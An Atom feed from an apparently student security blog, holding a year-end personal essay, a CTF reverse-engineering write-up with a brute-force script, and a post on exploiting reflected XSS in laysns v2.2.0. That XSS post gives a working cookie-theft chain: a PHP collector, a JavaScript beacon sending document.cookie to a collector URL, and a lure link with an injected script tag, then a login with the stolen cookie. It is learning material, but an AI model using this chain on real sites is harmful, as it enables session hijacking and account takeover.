<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KANGEL</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://j-kangel.github.io/"/>
  <updated>2019-02-22T11:57:01.356Z</updated>
  <id>https://j-kangel.github.io/</id>
  
  <author>
    <name>kangel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019</title>
    <link href="https://j-kangel.github.io/2018/12/31/2018/"/>
    <id>https://j-kangel.github.io/2018/12/31/2018/</id>
    <published>2018-12-31T13:25:54.000Z</published>
    <updated>2019-02-22T11:57:01.356Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？</p><p>我的2018还要从去年学校跨年晚会的那一刻说起，那是和轮滑社的朋友一起跨年，第一次体验学校的跨年晚会，和几个老朋友互道了新年快乐，然后就睡了。接下来的日子一如往昔，并没有什么特别的惊喜。</p><p>元旦到了基本就是要迎接期末考试了，于是大二上结束了，从后面的结果来看，我的考试还算顺利。我又在学校多呆了十天，主要是考科三。一切都很顺利，科三一遍过。后来暑假考了科四，2018，我拿到了驾驶证，从此再也不用担心无证驾驶被抓了。</p><p>回家之前，老爸突然说要给我买个单反。之前老爸就跟我说过，如果我大学拿到了奖学金就给我买单反。我差不多都快忘了这事，这是老爸又提起，他说：“早买早享受“。我觉得挺有道理，很多时候我们做某件事情都喜欢等，等最合适的时间，这样往往就错过了。于是，我有了自己的单反。我其实很早之前就想拥有一款单反，我喜欢照片最本真的样子。然后第二天就去了趟鼓浪屿，想去给相机开开光。那天下起“了小雨，虽然光源不太充足，但是也别有一般趣味。”群芳不厌寒中开，只为翘首盼君来。今日料知君将近，忙引甘露惹尘埃。“我写下了这首小诗来表达心中的喜悦。有人说，眼睛是天然的照相机。这句话不假。我觉得能拍出好的照片的有两种人，一种是学会创造美的人人，一种是发现美的人。想要拍出好的照片，首先眼睛里要有美的存在。眼睛用来发现美，相机用来定格美，如此，生活便美不胜收。</p><p>过年自然是要回家的。还是如往年一年，过年并没有多大的趣味，见几个老友，吹几场牛逼。但是2018不一样，没有趣味，但有感伤。姐姐出嫁了。我清楚的记得那天，上午还是热热闹闹的，等婚车把姐姐接走后，屋里边空荡荡的。老妈倚在门口，对我说：“家里突然少了个人还真有点不习惯”。我那天说了很少的话，姐姐被接走后，我点起了一根烟，发现尼古丁和焦油并没有大家说的那么神奇。后来喝了点啤酒，我其实是不抽烟也不喝酒的。然后头昏昏沉沉的就睡过去了。醒来发现还是空荡荡的。“人生几次此阵容，锣敲鼓捶，似烈马惊鸿。楼上郎妾秋波送，席间宾客欢声浓。 谁知喜事皆倥偬，苦烟浊酒，无济心事重。误以醉梦可消茕，醒来仍旧一场空。”只好填此《蝶恋花》聊以慰藉。</p><p>开学了，刚开始还是很舒服的，周末爬山去植物园，写了一篇小记：</p><p>”寒冬已逝，暖春悄至。恰近日，有灰云盗日，和风藏雨。遂携二三友，作爬山寻木之行。 久居室中，竟不知草木之涩，树花之美。每行两步，便惊于木叶之奇妆，叹于山间之空旷。渐行之，花欲盛，红似深宫娇娘起舞，紫如江湖侠女弄剑；树欲茂，青似少年驭马之英豪，墨如老僧念经之沉稳。至山顶，忽闻松涛阵阵，鸟声潺潺，心窃喜，此景山上有，山下哪得闻？ 置身于山中，唯愿闻之声可入耳，欲观之景可及目。故所闻所见，皆好声好色。叹之，无人之处，花开极盛！遂归记之。“</p><p>去了一次鼓浪屿拍建筑，清明去了东山岛。东山岛的海确实比厦门的好看，碧绿的海，还有贝壳可以捡。后来就渐渐进入了梦魇时期，盼望着这学期早点结束。</p><p>可能是对厦门的早餐过于失望，也可能是觉得好玩。我买了锅和油盐，然后早上就自己捣鼓早餐。有火腿、牛奶、鸡蛋、面包、水果等。体验了一把精致的生活，主要还是太麻烦，也可能是太懒，一个月之后，全部偃旗息鼓了。所以我决定，以后找个媳妇，首先教她做早餐，然后让她每天做给我吃哈哈哈。</p><p>期间过了一次生日，刚好20岁。还记得那天晚上，我在球场打球，没有任何准备。这是，体育部的一群人就冲上来了，他们手里都拿着不同的水果，水果上面写着祝福语。后来我们去了老张吃烧烤，他们还准备了蛋糕，上面写着“心之所向，身之所往”。那天确实很感动，已经很久没有什么能够打动我了。</p><p>5月11号，我去福州参加了信息安全铁人三项赛。那是我大学时期第一次参加比赛，那时的我真的是菜的抠脚，虽然现在是菜的抠手。但那次比赛之后，我有参加许多网络空间安全的比赛，渐渐的锻炼了自己，学到了不少东西，也获得不少奖项。我大学最终的方向也从此确定—-网络安全。直白点，就是黑客。这是一个漫长且有意思的事，我渐渐宅了起来，学习各种知识以及技术，希望某一天，你们懂得。。。</p><p>我有点乏了，有点写不下去了，感觉2018发生了好多事，记忆在不断交错重叠。</p><p>七月，暑假到了。我尝试留起了中分，拍了一组照片。后来姐姐生了，这意味着一个伟大的舅舅诞生了。小学期学了数据恢复，我在一张被格式化的内存卡里面会付出了300多张初中的照片。又再一次看到了青涩的自己，发现自己青涩如初。</p><p>哦，对了。2018，我听了一场GIN的演奏会，吉他上也有他的签名。我也看了一场五月天的演唱会，都是很不错的体验。</p><p>去了次婺源，徽派建筑确实像泼墨山水画。虽然没看到漫山遍野的花，但是晚秋之景也足以让人流连忘返。</p><p>后来开学了，开学之后就很少参加活动了，也很少出去玩。就感觉一直在不停的打比赛。然后就不停的拿奖哈哈，虽然奖项不高。</p><p>说起拿奖，我今年好像还拿了挺多奖的。填学年鉴定的时候，发现了一堆证书。室友看见了，说：“你怎么那么多证书？”我说：“我也不知道哪来这么多鬼东西”。然后我们就哈哈大笑。所有奖项里面最有含金量的当然是国奖，毕竟价值8000。有时候我也很奇怪，我没想过要拿国奖。在填写申请表的时候我才想到，何不试试呢?可能有运气加成，我知道自己几斤几两。</p><p>开学之前立了个flag，这学期尽量不迟到。然后，flag没倒，但是歪了。我差不多把要迟到的课都翘了，我这学期翘的课比我前20年翘的课加起来还多。翘课真的是会上瘾，人总是有侥幸心理。某次翘课没被抓，后面就会越翘越多。新年有个愿望，下学期就不翘课了。</p><p>我大概翘了一个学期的马原，因为它妨碍我搞钱了。说起搞钱，我现在不想读书不想恋爱只想搞钱。这学期除了拿奖学金，打比赛拿奖金之外，我还找了份兼职。我也不知道自己为什么会去找兼职，可能是暑假的时候玩多了太穷了吧，我还记得当时穷到把小黄的押金都退了。兼职是在一个托管班辅导小学生写作业，小学生都挺可爱的，满眼都是十多年前的自己。</p><p>还有什么呢？我记不起来了。哦，对，我买了vps，以后可以随心所欲的上外网了，我也可以“推特治国”了。2018吧，其实我觉得也不算快吧，发生了挺多事，遇见了不一样的自己。2019又会发生什么呢？谁知道呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？&lt;
      
    
    </summary>
    
    
      <category term="essay" scheme="https://j-kangel.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>xss_laysns</title>
    <link href="https://j-kangel.github.io/2018/12/26/xss_laysns/"/>
    <id>https://j-kangel.github.io/2018/12/26/xss_laysns/</id>
    <published>2018-12-26T14:40:22.000Z</published>
    <updated>2019-02-22T11:51:09.006Z</updated>
    
    <content type="html"><![CDATA[<p>0x00前言</p><p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p><p>0x01漏洞检测</p><p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p><p><img src="/2018/12/26/xss_laysns/1.png" alt=""></p><p>好了，果然存在反射型xss，开始攻击。</p><p>0x02跨站脚本攻击</p><p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p><p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着创建JS脚本hack.js，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p><p><img src="/2018/12/26/xss_laysns/2.png" alt=""></p><p>登录成功，攻击完成！</p><p>0x03结语</p><p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;0x00前言&lt;/p&gt;
&lt;p&gt;这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击
      
    
    </summary>
    
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://j-kangel.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>just reverse it</title>
    <link href="https://j-kangel.github.io/2018/12/10/reverse/"/>
    <id>https://j-kangel.github.io/2018/12/10/reverse/</id>
    <published>2018-12-09T20:19:25.000Z</published>
    <updated>2019-02-22T11:52:22.813Z</updated>
    
    <content type="html"><![CDATA[<p>IDA打开程序，查看start函数C伪代码。<br><img src="/2018/12/10/reverse/001.png" alt=""><br>首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402573是MD5计算函数，将4个部分的MD5值存放在64字节大小的v6中。具体对应关系如下图(每一格表示一个字节)。<br><img src="/2018/12/10/reverse/002.png" alt=""></p><p>如何看出sub_402573函数是MD5算法，进入该函数，看到两个函数，进入第一个，有一些初始赋值的操作，猜测为MD5。再返回来看v6，v6占64个字节，分成四部分就是16字节，每个字节包含两个十六进制，刚好每部分可以存一个MD5值，进一步猜测为MD5算法。于是动态调试进行验证。</p><p>将程序丢入od，在call sub_402573的地方下断点，运行程序，输入“1234567890123456”，继续运行，跟踪v6所在的内存，如下图，发现与“1234”、“5678”、“9012”、“3456”的MD5值相同，验证猜测。</p><p><img src="/2018/12/10/reverse/003.png" alt=""></p><p>接着到了strtol函数，这是一个C语言库函数。这里的意思是将v12的值转化为十六进制，中间的参数‘0’表示不返回非法字符串，意味着输入的每个字符应该是十六进制字符，否则每一部分可能就少于4个字符。由图2可知v12[3]+3、v12[2]+2、v12[1]+1、v12刚好对应每一部分字符串。</p><p>sub_4025b1函数，v12[3]+3 &gt; v12[2]+2 &gt; v12[1]+1 &gt; v12 &gt; 999，保证输入顺序。</p><p><img src="/2018/12/10/reverse/004.png" alt=""></p><p>sub_402513函数，是这道题最复杂的地方。首先来看传参，a1为输入值的一部分，a2为该部分的MD5值。关于小头位序存储方式，例如1234存为0x 34 12。因此，a2&gt;&gt;4即为MD5值的第一个字符，a2&amp;0xF为第二字符，(a2+1)&gt;&gt;4为第三个字符，(a2+1)&amp;0xF为第四个字符，这里只取MD5前四个字符作比较。</p><p>数字+48和字母+87是将十六进制转为assic码(ord(‘0’-0)=48，ord(‘a’-a)=87)。</p><p>v3是int型，占四个字节，分别为LOBYTE、BYTE1,、BYTE2、BYTE3。因此是将MD5值的3241与原字符串1234作比较，相等则为真。</p><p><img src="/2018/12/10/reverse/005.png" alt=""></p><p>最后和固定字符串进行异或得到flag，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                                md5=hashlib.md5()</span><br><span class="line">                                md5.update((i+j+k+l).encode(<span class="string">'utf8'</span>))</span><br><span class="line">                                <span class="keyword">if</span> md5.hexdigest()[:<span class="number">4</span>]==l+j+i+k:</span><br><span class="line">                                        sys.stdout.write(i+j+k+l)</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">"d\x01@flQAizAST\biTB"</span></span><br><span class="line">a = <span class="string">"31795a469327c6e6"</span></span><br><span class="line">flag = strxor(v3,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nflag&#123;%s&#125;"</span>%flag</span><br></pre></td></tr></table></figure><p>输入字符串为”31795a469327c6e6”，flag为：flag{W0w_Y0u_Crack_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;IDA打开程序，查看start函数C伪代码。&lt;br&gt;&lt;img src=&quot;/2018/12/10/reverse/001.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402
      
    
    </summary>
    
    
      <category term="reverse" scheme="https://j-kangel.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>note</title>
    <link href="https://j-kangel.github.io/2018/11/26/note/"/>
    <id>https://j-kangel.github.io/2018/11/26/note/</id>
    <published>2018-11-25T22:57:17.000Z</published>
    <updated>2019-02-22T11:44:25.887Z</updated>
    
    <content type="html"><![CDATA[<p>life is beautiful!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;life is beautiful!&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="note" scheme="https://j-kangel.github.io/tags/note/"/>
    
  </entry>
  
</feed>
